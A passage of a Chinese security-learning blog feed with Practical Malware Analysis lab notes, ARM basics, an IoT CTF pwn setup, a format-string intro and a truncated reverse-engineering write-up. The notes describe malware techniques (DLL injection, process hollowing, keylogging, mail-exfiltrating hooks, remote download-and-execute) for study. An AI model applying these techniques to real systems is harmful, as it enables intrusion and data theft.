一个名为<code>installer</code>的函数</p><ul><li><p>使用run32dll.exe来安装这个恶意代码之后，发生了什么？</p><p>恶意代码会将<code>spoolvxx32.dll</code>复制到系统目录中<code>system32\</code>，然后打开并处理<code>Lab11-02.ini</code></p></li><li><p>为了使这个恶意代码正确安装，Lab11-02.ini必须放置在何处？</p><p><code>system32\</code></p></li><li><p>这个安装的恶意代码如何驻留？</p><p>通过<code>installer</code>函数将<code>spoolvxx32.dll</code>安装到<code>AppInit_DLLS</code>表项</p></li><li><p>这个恶意代码采用的用户态Rootkit技术是什么？</p><p>针对<code>wsock32.dll</code>中的<code>send</code>函数安装了inline hook</p></li><li><p>挂钩代码做了什么？</p><p>检查对外的所有邮件，并发送到恶意邮箱</p></li><li><p>哪个或者哪些进程执行了这个恶意攻击，为什么？</p><p>MSIMN.exe、THEBAT.exe、OUTLOOK.exe</p></li><li><p>.ini文件的意义是什么？</p><p>保存了一个加密的恶意邮箱地址</p></li><li><p>你怎样用WireShark动态抓获这个恶意代码的行为？</p><p>查看这个恶意代码发送的邮件信息</p></li></ul><h2 id="ch12"><a href="#ch12" class="headerlink" title="ch12"></a>ch12</h2><h3 id="12-1"><a href="#12-1" class="headerlink" title="12-1"></a>12-1</h3><p>用IDA查看exe文件的main函数</p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321160643586.png" alt="image-20210321160643586"></p><ul><li>三次动态载入<code>psapi.dll</code>，分别得到三个函数</li><li>调用<code>EnumProcess</code>函数枚举进程</li><li>对于每个进程，调用<code>sub_401000</code>函数，对比该进程是否是explorer.exe，如果是，则获取该进程句柄</li><li>调用<code>VirtualAllocEx</code>函数在该进程内分配一段空间，保存起始地址到<code>lpBaseAddress</code></li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321162537301.png" alt="image-20210321162537301"></p><ul><li>将<code>Lab12-01.dll</code>的路径写入该空间</li><li>获取<code>kernel32.dll.LoadLibraryA</code>的函数地址，并返回给<code>lpStartAddress</code></li><li>调用<code>CreateRemoteThread</code>函数创建远程线程，即用explorer.exe进程调用<code>kernel32.dll.LoadLibraryA</code>，参数为<code>Lab12-01.dll</code>的路径，从而实现dll注入</li></ul><p>用IDA查看dll文件</p><ul><li>其主函数只是执行了创建线程的命令，进入函数<code>sub_10001030</code>查看</li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321163232518.png" alt="image-20210321163232518"></p><ul><li>该函数每隔一段时间会创建线程，进入<code>StartAddress</code>查看</li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321163352810.png" alt="image-20210321163352810"></p><ul><li>可知这些线程会生成窗体</li></ul><h4 id="问题-3"><a href="#问题-3" class="headerlink" title="问题"></a>问题</h4><ul><li><p>运行可执行程序时会发生什么</p><p>每隔一段时间弹出窗口</p></li><li><p>哪个进程会被注入</p><p>explorer.exe</p></li><li><p>如何能让恶意代码停止弹出窗口</p><p>终止explorer.exe即可</p></li></ul><h4 id="12-2"><a href="#12-2" class="headerlink" title="12-2"></a>12-2</h4><p>查看主函数</p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321201430999.png" alt="image-20210321201430999"></p><ul><li>获取当前模块句柄，调用函数<code>sub_40149D</code>，得到\svchost.exe的绝对路径</li><li>调用<code>sub_40132C</code>函数，参数为之前获得的句柄，进入查看</li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321202033984.png" alt="image-20210321202033984"></p><ul><li>将资源节的数据加载到新分配的内存区，经过一系列操作后，需要调用函数<code>sub_401000</code>，该函数会对载入的内存区和65进行异或操作，推测为<strong>解密函数</strong>，最后会将解密得到的地址的头部返回给主函数</li><li>回到主函数，调用<code>sub_4010EA</code>函数，参数为此前获得的头部路径和解密数据的地址头部，进入查看</li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321202933204.png" alt="image-20210321202933204"></p><ul><li>开头会对解密数据进行校验并进行初始化工作，然后调用<code>CreateProcessA</code>函数启动<code>svchost.exe</code>进程，注意其参数设置使其以<strong>挂起状态</strong>启动</li><li>申请内存空间，获取线程上下文</li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321203628272.png" alt="image-20210321203628272"></p><ul><li>获取进程上下文，并获取<code>ntdll.dll.NtUnmapViewOfSection</code>函数地址</li><li>调用<code>NtUnmapViewOfSection</code>函数释放掉新创建的进程的空间，用以填充恶意代码</li><li>调用<code>VirtualAllocEx</code>函数在挂起的进程中分配内存，调用<code>WriteProcessMemory</code>函数向该进程内写入数据，注意写入分多次，先写入头部，再循环写入各节，最后写入尾部</li><li>调整之前保存的线程上下文，并设置到当前线程</li></ul><p>exe文件分析结束，分析加密数据</p><ul><li><p>使用Resource Hacker提取资源节为二进制文件</p></li><li><p>使用winhex，在其中修改数据，选择xor 41，结果如下，为明显的PE文件，用来替换svchost.exe，将修改后的数据另存为</p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321211128337.png" alt="image-20210321211128337"></p></li><li><p>进入IDA查看保存的文件，其main函数如下</p></li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321211335100.png" alt="image-20210321211335100"></p><ul><li>调用<code>AllocConsole</code>函数为进程分配一个控制台，并获取句柄，设置控制台窗口状态位隐藏窗口</li><li>调用函数<code>SetWindowsHookExA</code>，设置一个全局钩子，指向<code>fn</code>函数，第一个参数设置为13，表示对<strong>底层键盘输入</strong>事件进行监视，查看<code>fn</code>函数</li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210322134808026.png" alt="image-20210322134808026"></p><ul><li>可以看到其调用了<code>sub_4010C7</code>函数，该函数虽然长，但结构比较清晰，功能为将部分键盘输入保存到<code>practicalmalwareanalysis.log</code>文件中</li></ul><h4 id="问题-4"><a href="#问题-4" class="headerlink" title="问题"></a>问题</h4><ul><li><p>程序的目的是什么</p><p>启动并替换svchost.exe进程，启动恶意代码</p></li><li><p>启动器恶意代码是如何隐蔽执行的</p><p>替换svcHost.exe进程，获取其权限</p></li><li><p>恶意代码的负载存储在哪里</p><p>被加密后资源节</p></li><li><p>恶意负载是如何被保护的</p><p>对恶意负载进行了简单异或加密，进程替换时会进行解密</p></li><li><p>字符串列表是如何被保护的</p></li></ul><h3 id="12-3"><a href="#12-3" class="headerlink" title="12-3"></a>12-3</h3><p>居然就是12-2提取出来的文件</p><h3 id="12-4"><a href="#12-4" class="headerlink" title="12-4"></a>12-4</h3><p>IDA查看主函数</p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210322200407794.png" alt="image-20210322200407794"></p><ul><li>载入三个函数</li><li>调用<code>EnumProcesses</code>函数枚举进程</li><li>对于每一个进程，调用函数<code>sub_401000</code>，该函数会将获取的进程名称与winlogon.exe比较，如果是则返回1，可见该循环的作用是查找winlogon.exe的PID</li><li>找到之后，调用函数<code>sub_401174</code></li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210322202436196.png" alt="image-20210322202436196"></p><ul><li>该函数首先调用<code>sub_4010FC</code>函数，该函数为提权操作</li><li>获取<code>sfc_os.dll</code>中编号为2的函数地址，保存到lpStartAddress。经查询，该函数为<code>SfcTerminateWatcherThread</code>，可以禁用windows文件保护机制</li><li>在winlogon.exe进程中创建远程线程，实现该函数的进程注入</li><li>回到主函数</li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210322202953340.png" alt="image-20210322202953340"></p><ul><li>获取当前目录，与\system32\wupdmgr.exe拼接，保存到ExistingFileName</li><li>获取临时路径，与\winup.exe拼接，保存到NewFileName</li><li>调用<code>MoveFile</code>函数将wupdmgr.exe复制为winup.exe</li><li>调用函数<code>sub_4011FC</code>，进入查看</li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210322203417787.png" alt="image-20210322203417787"></p><ul><li>调用函数<code>FindResourceA</code>，提取Bin #101资源节</li><li>将提取文件写入\system32\wupdmgr.exe，调用<code>WinExec</code>函数执行</li></ul><p>exe文件解析完毕，接下来用Resource Hacker提取资源节，获取到可执行文件4.exe，进入IDA分析</p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210322204311784.png" alt="image-20210322204311784"></p><ul><li>调用函数<code>URLDownloadToFileA</code>，从<a href="http://www.practicalmalwareanalysis.com/updater.exe%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E4%BF%9D%E5%AD%98%E5%88%B0%E6%8C%87%E5%AE%9A%E8%B7%AF%E5%BE%84%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%AE%8C%E6%88%90%E5%90%8E%E6%89%A7%E8%A1%8C%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81">http://www.practicalmalwareanalysis.com/updater.exe下载文件保存到指定路径，下载完成后执行下载的恶意代码</a></li></ul><h2 id="ch14"><a href="#ch14" class="headerlink" title="ch14"></a>ch14</h2><h3 id="14-1"><a href="#14-1" class="headerlink" title="14-1"></a>14-1</h3><p>IDA分析exe程序，main函数如下所示</p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210323085400136.png" alt="image-20210323085400136"></p><ul><li>调用函数<code>GetCurrentHwProfileA</code>获取硬件配置信息</li><li>将用户名和硬件配置信息写入Str，作为参数调用函数<code>sub_4010BB</code>，经分析发现该函数调用的函数<code>sub_401000</code>中使用了base字段，推测该函数为base加密函数，加密结果保存到v9</li><li>调用函数<code>sub_4011A3</code>，进入查看</li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210323090404872.png" alt="image-20210323090404872"></p><ul><li>该函数会拼接一个url字段，显然这是一个文件，并调用函数<code>URLDownloadToCacheFileA</code>对该文件进行下载</li><li>运行下载后的文件</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ARM-入门</title>
      <link href="2020/12/29/Arm-%E5%85%A5%E9%97%A8/"/>
      <url>2020/12/29/Arm-%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>要逆向一个arm框架的板子，在开始动手前先熟悉一下arm相关基础</strong></p><a id="more"></a><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><p>!(Arm-入门/ARM_Calling_Convention.png)</p><img src="/2020/12/29/Arm-%E5%85%A5%E9%97%A8/image-20201230110026737.png" alt="image-20201230110026737" style="zoom:67%;"><ul><li>R0在算术操作期间可作为累加器，或存储之前调用的函数结果（32位）</li><li>函数的前四个参数保存在R0-R3中，剩下参数入栈，入栈顺序于参数顺序相反</li><li>R13指向堆栈顶部</li><li>R14用作链接寄存器，保存子程序返回时的地址</li><li>R15为程序计数器，自动增加指令执行大小，在arm下，该大小为4字节，在THUMB模式下为2字节</li></ul><h3 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h3><p>ARM处理器有两种可运行的主要状态：</p><ul><li>ARM，指令32位</li><li>Thumb，指令16位</li></ul><p>注意，在编写shellcode时，不应包含NULL字节，应尽量使用Thumb指令</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>西湖论剑IoT闯关赛pwn漏洞复现</title>
      <link href="2020/12/26/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9Bpwn%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/12/26/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9Bpwn%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>这次是arm框架的IoT设备，参照学长博客开始复现漏洞</strong></p><a id="more"></a><h2 id="开发板使用"><a href="#开发板使用" class="headerlink" title="开发板使用"></a>开发板使用</h2><p>可以参考官方给出的<a href="https://mp.weixin.qq.com/s/IGZUIY2w8aRJZUbZa3UqHA">介绍</a>，接口如下图所示</p><p><img src="/2020/12/26/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9Bpwn%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1" alt="图片"></p><p>主要还是需要使用上方的两个接口进行调试，红色标出的MCU重置按键按键在之后烧录中也会用到。</p><h3 id="题目写入方法"><a href="#题目写入方法" class="headerlink" title="题目写入方法"></a>题目写入方法</h3><p>使用ubuntu16.04虚拟机环境进行烧录</p><h4 id="串口连接方法"><a href="#串口连接方法" class="headerlink" title="串口连接方法"></a>串口连接方法</h4><p>作者是在虚拟机linux环境下进行串口环境配置，经不完全验证使用windows环境的串口可能无法立刻正常链接到板子</p><p>首先连接串口到虚拟机，查看usb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~$ lsusb</span><br><span class="line">Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub</span><br><span class="line">Bus 002 Device 008: ID 10c4:ea60 Cygnal Integrated Products, Inc. CP210x UART Bridge / myAVR mySmartUSB light</span><br><span class="line">Bus 002 Device 003: ID 0e0f:0002 VMware, Inc. Virtual USB Hub</span><br><span class="line">Bus 002 Device 002: ID 0e0f:0003 VMware, Inc. Virtual Mouse</span><br><span class="line">Bus 002 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub</span><br></pre></td></tr></table></figure><p>输入<code>dmesg | grep usb</code>,最后可以查看到</p><p><img src="/2020/12/26/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9Bpwn%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201229095536844.png" alt="image-20201229095536844"></p><p>现在可以用ttyUSB0文件作为串口了</p><p>这里使用minicom工具来进行串口环境，首先要进行配置，输入<code>sudo minicom -s</code></p><img src="/2020/12/26/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9Bpwn%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201229095757330.png" alt="image-20201229095757330" style="zoom:80%;"><p>选择串口安装</p><img src="/2020/12/26/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9Bpwn%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201229095857394.png" alt="image-20201229095857394" style="zoom:67%;"><p>修改A项为<code>/dev/ttyUSB0</code>，F项为<code>No</code>,保存到默认配置文件，选择Exit退出</p><p>打开minicom，重连串口设备，可以正常连接</p><img src="/2020/12/26/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9Bpwn%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201229100926565.png" alt="image-20201229100926565" style="zoom:67%;"><h2 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h2><h2 id="Pwn2"><a href="#Pwn2" class="headerlink" title="Pwn2"></a>Pwn2</h2><h2 id="Pwn3"><a href="#Pwn3" class="headerlink" title="Pwn3"></a>Pwn3</h2><p>首先nmap扫描可以找到9999的端口，用nc连上可以看到题目的输入接口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~$ nmap 20.20.11.14</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2020-12-29 02:41 PST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 20.20.11.14</span><br><span class="line">Host is up (0.013s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">9999/tcp open  abyss</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 2.39 seconds</span><br><span class="line"></span><br><span class="line">ssr@ubuntu:~$ nc 20.20.11.14 9999</span><br><span class="line">Please registered account </span><br><span class="line">Input your username:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>检查题目固件，可以看到是arm小端结构，没开canary，开了NX保护，但是实际上这个保护没在板子上起作用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/west$ file pwn3</span><br><span class="line">pwn3: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, <span class="keyword">for</span> GNU/Linux 5.4.0, not stripped</span><br><span class="line">ssr@ubuntu:~/iot/west$ checksec pwn3</span><br><span class="line">[*] <span class="string">&#x27;/home/ssr/iot/west/pwn3&#x27;</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure><p>用IDA打开康康，首先是main函数</p><img src="/2020/12/26/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9Bpwn%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201229190009809.png" alt="image-20201229190009809" style="zoom:80%;"><p>（这么清爽的函数真是不多了）接下来逐个函数查找漏洞</p><h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><h4 id="栈溢出1"><a href="#栈溢出1" class="headerlink" title="栈溢出1"></a>栈溢出1</h4><p>registered函数中scanf读入用户名</p><img src="/2020/12/26/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9Bpwn%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201229191323434.png" alt="image-20201229191323434" style="zoom:67%;"><h4 id="栈溢出2"><a href="#栈溢出2" class="headerlink" title="栈溢出2"></a>栈溢出2</h4><p>modify函数复制数据到主函数v6，主函数v6仅长40字节，但可复制0x48字节</p><img src="/2020/12/26/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9Bpwn%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201229193136413.png" alt="image-20201229193136413" style="zoom:80%;"><p>主要利用这两个，其实在delete函数中还存在一个UAF漏洞，但我不会用，这两个也够了</p><h3 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>测试第一个栈溢出漏洞，可以在register结束后在调用info函数查看溢出情况，这里需要在主函数调用info前<code>0x00010ED8</code>处下断点</p><p>这里先用qemu模拟arm环境，我原来已安装过qemu，但在直接执行上出了点文件，没有找到对应库函数，需要安装并指定共享环境，问题和解决方法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/west$ qemu-arm -L ./ ./pwn3</span><br><span class="line">/lib/ld-linux.so.3: No such file or directory</span><br><span class="line">ssr@ubuntu:~/iot/west$ sudo apt-get install libc6-armhf-cross</span><br><span class="line"></span><br><span class="line">ssr@ubuntu:~/iot/west$ qemu-arm -L /usr/arm-linux-gnueabihf/ ./pwn3</span><br><span class="line">Please registered account </span><br><span class="line">Input your username:</span><br></pre></td></tr></table></figure><p>启动<code>qemu-user</code>的调试模式<code>qemu-arm -g 3456 -L /usr/arm-linux-gnueabihf/ ./pwn3 | hexdump -C</code>，在另一个终端启动gdb进行调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/west$ gdb-multiarch -q ./pwn3</span><br><span class="line">pwndbg: loaded 190 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from ./pwn3...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> endian little</span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> solib-search-path /usr/arm-linux-gnueabihf/lib</span><br><span class="line">pwndbg&gt; b * 0x00010ED8</span><br><span class="line">Breakpoint 1 at 0x10b10</span><br><span class="line">pwndbg&gt; target remote:3456</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在模拟器端用户名输入a*20尝试填满src缓冲区</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn格式化字符串漏洞的初步学习</title>
      <link href="2020/12/22/pwn%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/12/22/pwn%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>逆向学了一部分还需要学更多pwn的内容，所以继续往下学</p><a id="more"></a><h2 id="格式化字符串漏洞简介"><a href="#格式化字符串漏洞简介" class="headerlink" title="格式化字符串漏洞简介"></a>格式化字符串漏洞简介</h2><p>格式化字符串函数为使用第一个参数作为格式化字符串并解析之后参数的函数，对于C语言，包括最常用的scanf和printf等</p><p>其中格式化字符串基本格式如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;%[parameter][flags][field width][.precision][length]type&quot;</span></span><br><span class="line"><span class="comment">//parameter:获取格式化字符串的指定参数</span></span><br><span class="line"><span class="comment">//field width:输出的最小宽度</span></span><br><span class="line"><span class="comment">//.precision:输出的最大精度</span></span><br><span class="line"><span class="comment">//length:输出的长度，hh为输出一个字节，h为输出一个双字节</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">type:</span></span><br><span class="line"><span class="comment">d/i,有符号整数</span></span><br><span class="line"><span class="comment">u，无符号整数</span></span><br><span class="line"><span class="comment">x/X，16进制无符号整数</span></span><br><span class="line"><span class="comment">s,字符串</span></span><br><span class="line"><span class="comment">c,字符</span></span><br><span class="line"><span class="comment">p,用地址的格式打印type变量的值</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>格式化字符串函数解析字符串是通过后续的参数进行的，所以若能控制之后的参数，便可以利用格式化字符串函数进行自己的操作，即为格式化字符串漏洞</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>祥云杯re-writeup</title>
      <link href="2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/"/>
      <url>2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/</url>
      
        <content type="html"><![CDATA[<p>祥云杯比赛那天没来得及参加，只能事后补补，先做做re，如果有时间看看pwn</p><a id="more"></a><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>先查壳，无壳</p><img src="/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/image-20201217202427255.png" alt="image-20201217202427255" style="zoom: 67%;"><p>IDA分析打开，找到main函数f5</p><img src="/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/image-20201217202849766.png" alt="image-20201217202849766" style="zoom:80%;"><p>输入被保存到v4，注意v5[32]的值存储的是v4+36处的值，可以发现输入应该是<code>flag&#123;32位字符串&#125;</code>的形式，查看sub_810，结果提示函数太长，进入查看汇编，找到最后比较的部分</p><img src="/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/image-20201217205141526.png" alt="image-20201217205141526" style="zoom:67%;"><p>函数在最后进行了逐位对比，共32位，由于之前加密过程实在复杂，但各位之间没有彼此关联，故尝试输入字符串<code>flag&#123;1234567890abcdefghijklmnopqrstuv&#125;</code>调试查看加密结果，这里使用IDA远程调试,在开始比较处下一个断点</p><img src="/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/image-20201220182236882.png" alt="image-20201220182236882" style="zoom:80%;"><p>查看ptr具体内容，这就是1-0、a-v对应的加密值，发现这一加密对于数字值和字母值是增1序列，数字为从E8(对应0)开始，字母为从19(对应a)开始，发现逐位对比的标准没有超出0-9和小写字母的范围</p><img src="/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/image-20201220182356526.png" alt="image-20201220182356526" style="zoom:67%;"><p>最终执行脚本和结果如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">key =  [<span class="number">0xeb</span>, <span class="number">0xf1</span>, <span class="number">0x19</span>, <span class="number">0xe8</span>, </span><br><span class="line"><span 